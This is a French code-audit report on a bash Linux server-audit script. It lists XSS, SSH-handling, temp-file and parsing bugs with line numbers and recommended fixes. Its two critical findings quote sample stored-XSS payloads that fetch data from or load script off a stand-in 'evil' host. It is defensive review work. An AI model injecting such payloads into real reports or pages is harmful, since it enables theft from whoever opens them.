# Audit de code — `linux-audit.sh`

Audit réalisé par lecture intégrale du script (2000 lignes) et par une passe multi-agents
(8 auditeurs par angle → déduplication → vérification adversariale). 69 constats bruts,
39 après déduplication. Les points sensibles ont été rejoués localement pour confirmation.

Modèle de menace retenu (cohérent avec le but de l'outil) : **le serveur audité peut être
compromis ou hostile**. Toute chaîne renvoyée par SSH (`hostname`, `ps`, `df`, `ip`, SAR…)
est donc potentiellement contrôlée par un attaquant.

---

## Critiques

### C1 — XSS stocké via le hostname distant (L227, L372)
`html_init` interpole `$REMOTE_HOSTNAME` (issu de `ssh_exec "hostname"`, L1965) sans échappement
dans `<title>` (L227) et dans l'en-tête `<strong>` (L372). `html_escape()` existe (L214) et est
utilisée ailleurs, mais ce chemin la contourne. Un hostname
`x</title><script>fetch('//evil/'+…)</script>` s'exécute quand l'auditeur ouvre le rapport →
pivot du serveur compromis vers le poste de l'auditeur. Même un hostname légitime `r&d-01`
casse le HTML. **Vérifié (3/3 votes adversariaux, non réfuté).**

### C2 — XSS stocké via toutes les cellules de tableau (L470)
`html_table_row` émet chaque cellule brute (`<td>${cell}</td>`, L470) sans échappement. Au moins
6 sites d'appel y injectent des données distantes non échappées : df (L1292), iostat/diskstats
(L1327, L1353), interfaces/IP réseau (L1470), champs `ps aux` USER/PID/%CPU/%MEM (L1551, L1572,
L1593 — seul `cmd` est échappé), anomalies SAR (L1787, L1789). Le filtre `grep` sur les noms de
device tourne **sur la machine distante** (dans `ssh_exec`) : il ne protège donc pas. Charge
sans espace (`<script/src=//evil/x.js>` comme champ USER) survit à `awk '{print $1}'`.
Corollaire : toute valeur contenant `|` décale les colonnes (split sur `IFS='|'`).
**Vérifié (3/3 votes, non réfuté).**

---

## Élevés

### H1 — Colonnes iostat codées en dur, fausses sur toutes les versions (L1166-1169)
Le parsing temps réel fixe `$3=rMB/s, $4=wMB/s, $10=await, $NF=%util`. Sur `iostat -x -m`
(sysstat ≥ 10) l'ordre réel est `Device r/s w/s rMB/s wMB/s …` : `$3` est en fait `w/s`, `$4`
est `rMB/s`. Les débits affichés sont faux et les alertes de latence (`await`) tapent dans la
mauvaise colonne → alertes fausses ou manquées sur chaque plateforme.

### H2 — Le graphique CPU « 24h » choisit le mauvais fichier SAR (L530)
`for f in ${sar_path}/sa[0-9][0-9] …; do [ -f "$f" ] && today_file="$f"; done` retient le
**dernier** fichier dans l'ordre du glob (lexicographique), pas le plus récent. Confirmé
localement : avec `sa09 sa28 sa31` présents, il choisit `sa31` — donc en début de mois le
graphique « dernières 24h » affiche des données du mois précédent.

### H3 — Chemin de clé SSH non quoté (L148, L171)
`opts="$opts -i $SSH_KEY"` puis `ssh $opts …` sans guillemets : un chemin de clé contenant une
espace (`-i "/home/me/my key.pem"`) est découpé, une partie devient l'hôte de destination.
Toutes les erreurs sont masquées par `2>/dev/null`.

### H4 — NB_CPUS reste à 1 sur variantes lscpu → fausse alerte load (L757)
`NB_CPUS` n'est réassigné que dans la branche exigeant `Socket(s):` **et** `Core(s) per socket:`.
Sur des libellés lscpu différents (RHEL6 `CPU socket(s):`, ARM `Cluster(s):`), `NB_CPUS` reste 1
alors que `cpu_threads` a été lu → ratio load/CPU surévalué → fausses alertes CRITIQUES.

### H5 — Fichiers temporaires distants prévisibles (L1198-1201, L1227)
Le fallback diskstats écrit `/tmp/diskstats1` et `/tmp/diskstats2` en dur, par redirection
tronquante, sans `mktemp`. En SSH root (défaut), un lien symbolique piégé permet d'écraser un
fichier arbitraire ; corruption inter-utilisateurs et courses entre exécutions concurrentes.

### H6 — XSS via `percent` dans un attribut style (L439, L868)
`html_progress_row` injecte `percent` dans `style="width: ${percent}%"` sans validation
numérique ; le site d'appel CPU y passe la sortie distante brute (L868).

### H7 — first_time/last_time SAR injectés bruts dans le SVG (L655-656)
`generate_cpu_sar_chart` place les heures issues de la sortie SAR distante directement dans des
`<text>` SVG sans échappement.

### H8 — Noms de fichiers locaux construits sur un hostname non assaini (L1740, L1968)
`${TIMESTAMP}-${REMOTE_HOSTNAME}-audit.html` / `-sar.gz`. Un hostname distant contenant `/` ou
`..` redirige/casse/piège l'écriture locale à la toute fin d'un run de plusieurs minutes.

### H9 — Vérification de clé d'hôte désactivée en silence (L47)
`StrictHostKeyChecking=no` sur chaque connexion + toutes les alertes SSH jetées : l'utilisateur
n'est jamais prévenu qu'une clé d'hôte a été auto-acceptée ou a changé (MITM non signalé).

### H10 — Mot de passe exposé en argv (L154, L1900)
`-P 'password'` (forme documentée et encouragée, L86) place le mot de passe dans l'argv du
script — visible par tout utilisateur local via `ps` pendant tout le run, et consigné dans
l'historique du shell. De plus `sshpass -p "$SSH_PASSWORD"` est réinvoqué à chaque commande
distante (préférer `sshpass -e`/`-f`).

### H11 — Échec SSH en cours de run → rapport fabriqué, exit 0 (L154-156)
`ssh_exec` jette stderr et le code retour ; aucun appelant ne teste `$?`. Après le seul test de
connexion initial, une perte de connexion produit un rapport complet mais fabriqué (valeurs
vides parsées comme des données), avec un code de sortie 0.

### H12 — Division par zéro mémoire (L913, L917)
`mem_used_percent=$((mem_used_mb * 100 / mem_total_mb))` : si le `cat /proc/meminfo` (L890)
renvoie vide, `mem_total_mb=0` → erreur bash « division by 0 » sur stderr et section mémoire en
vrac.

### H13 — Fausse alerte CRITIQUE load quand /proc/loadavg est illisible (L1065, L1072)
Si `load1` est vide, `echo "$load1 $NB_CPUS" | awk '{printf "%.2f",$1/$2}'` subit un décalage de
champ : `$1=NB_CPUS`, `$2` vide → division par zéro → `ratio=inf`. `float_ge inf 1.5` est vrai →
**fausse alerte CRITIQUE**. Confirmé localement.

---

## Moyens

- **M1 (L469)** — `for cell in $cells` non quoté : chaque cellule subit l'expansion glob contre
  le répertoire local → fuite de noms de fichiers locaux dans le rapport, lignes corrompues.
- **M2 (L1217)** — `await` du fallback diskstats = temps-occupé-ms / secteurs transférés, au lieu
  de temps-d'attente / nombre de requêtes → valeur de latence dénuée de sens.
- **M3 (L944)** — Barre mémoire empilée : `used_real_mb = mem_used_mb - buffers - cache`, mais
  `mem_used_mb` exclut déjà buffers/cache (les deux chemins de calcul) → double soustraction.
- **M4 (L1401)** — `/proc/net/dev` parsé par position ; sur noyaux RHEL6 (`%6s:%8lu` sans espace
  après `:`) le nom d'interface est collé aux octets RX → tous les champs décalés dès que le
  compteur remplit le champ de 8 caractères.
- **M5 (L1898)** — La forme documentée `-P <hostname>` (prompt interactif) est cassée : le parser
  prend le hostname comme mot de passe → `./linux-audit.sh -u admin -P serveur` avorte sur
  « Hostname ou IP requis ».
- **M6 (L822)** — Le calcul principal d'I/O wait est un placeholder mort qui renvoie toujours `0`
  (son awk lit même le mauvais champ de /proc/stat) après 2 allers-retours SSH gâchés ; sans
  vmstat, le script affiche un « I/O Wait: 0% » fabriqué et les alertes iowait ne peuvent jamais
  se déclencher.
- **M7 (L537)** — Le filtre du graphique CPU (`grep timestamp | grep -v CPU`) laisse passer les
  lignes `LINUX RESTART` de sysstat < 11.1.4 (RHEL6/7, supportés) → point de données factice à
  zéro qui écrase toute l'aire empilée.
- **M8 (L751, L1155)** — `lscpu` et `iostat` gardés par `LANG=C` au lieu de `LC_ALL=C` (règle du
  projet) : un `LC_ALL`/`LC_*` forwardé par SSH (SendEnv `LANG LC_*` par défaut sur Debian/Ubuntu)
  écrase la garde et casse le parsing des libellés et décimales.
- **M9 (L1155)** — `iostat -y` n'existe pas sur sysstat 9.0.4 (RHEL6) : le chemin iostat principal
  échoue en silence, on retombe toujours sur le fallback diskstats plus grossier.
- **M10 (L1653)** — La détection dynamique de colonnes `grep 'DEV|await|%util' | head -1` peut
  matcher la bannière du rapport SAR (si le hostname/kernel contient `DEV`) au lieu de l'en-tête →
  retombée silencieuse sur des indices legacy erronés.
- **M11 (L512, L1747)** — Rapport HTML et export SAR créés avec l'umask par défaut (souvent 0644,
  lisibles par tous) alors qu'ils contiennent des données d'infrastructure sensibles ; aucun
  `chmod`/`umask`.
- **M12 (L1886)** — Un flag sans valeur (`./linux-audit.sh -u`) fait **boucler indéfiniment**
  `parse_arguments` : `shift 2` avec un seul paramètre restant ne shift rien et ne sort jamais.
  Confirmé localement.
- **M13 (L1749)** — `[ -s "$output_file" ]` ne détecte pas un export SAR vide/tronqué : gzip d'une
  entrée vide produit tout de même 20 octets (confirmé). Faux « succès » d'export.
- **M14 (L163)** — `remote_cmd_exists` confond échec de transport SSH et « commande absente » : une
  coupure transitoire est consignée dans le rapport comme outillage manquant.

---

## Faibles

- **L1 (L786)** — L'utilisation CPU compte l'iowait comme temps occupé (`idle_diff` ne soustrait
  que `idle`, mais `total` inclut `iowait`) → utilisation surévaluée sur hôtes I/O-bound.
- **L2 (L1688)** — Tri « plus récent d'abord » des anomalies SAR par comparaison lexicale de
  `DD/MM/YYYY` → ordonne par jour du mois, faux aux frontières de mois/année.
- **L3 (L1684-1685)** — `sort -k7 -rn` tourne sous la locale de l'opérateur ; en locale à virgule
  (fr_FR) GNU sort ne lit les décimales pointées SAR que jusqu'au `.` → mauvais top-10.
- **L4 (L1704)** — `analyze_sar_io_history` ne distingue pas « pas de données disque » de « pas
  d'anomalie » : stdout vide affiche quand même le succès vert.
- **L5 (L1371)** — Collecte réseau dépend de `ip`/`ifconfig` dans le PATH non interactif ; sur
  RHEL le PATH sshd des non-root exclut `/sbin` `/usr/sbin` → le mode audit non-root perd toute
  la section réseau.
- **L6 (L512)** — `write_html_report` affiche « Rapport HTML genere » inconditionnellement, même
  si la redirection d'écriture a échoué.
- **L7 (L1106)** — Le filtre df `grep -vE 'tmpfs|cdrom|devtmpfs'` non ancré exclut aussi les vrais
  systèmes de fichiers dont le device/mount contient ces sous-chaînes.
- **L8 (L1133)** — Les messages d'alerte contenant `|` (mounts, devices) sont scindés par le
  stockage d'alertes pipe-délimité → entrées corrompues dans la synthèse.
- **L9 (L216)** — `html_escape` utilise `echo "$text"` : une valeur valant exactement une option
  d'echo (`-n`, `-e`, `-ne`…) est consommée comme flag.

---

## Recommandations prioritaires

1. **Échapper tout** ce qui vient du distant avant insertion HTML : appliquer `html_escape` dans
   `html_table_row`, `html_progress_row`, sur `$title`/`$date` de `html_init`, et sur les
   heures SVG. Corrige C1, C2, H6, H7.
2. **Assainir le hostname** avant tout usage dans un nom de fichier local (`tr -cd 'A-Za-z0-9._-'`).
   Corrige H8.
3. **Quoter** `"$SSH_KEY"` et construire les options SSH en tableau plutôt qu'en chaîne. Corrige H3.
4. **Colonnes dynamiques pour iostat** comme c'est déjà fait pour `sar -d`. Corrige H1.
5. **Sélection SAR par date/mtime** (`ls -t` ou tri sur date interne) au lieu de l'ordre de glob.
   Corrige H2.
6. **Gérer les valeurs vides** avant arithmétique (`mem_total_mb`, `load1`, `NB_CPUS`) et propager
   les échecs SSH. Corrige H11, H12, H13, M12.
7. **Mot de passe** : `sshpass -e` (variable d'env) au lieu de `-p` en argv ; ne pas encourager
   `-P 'secret'`. `umask 077` avant d'écrire les rapports. Corrige H10, M11.
8. **`mktemp -p /tmp`** côté distant au lieu de chemins fixes. Corrige H5.
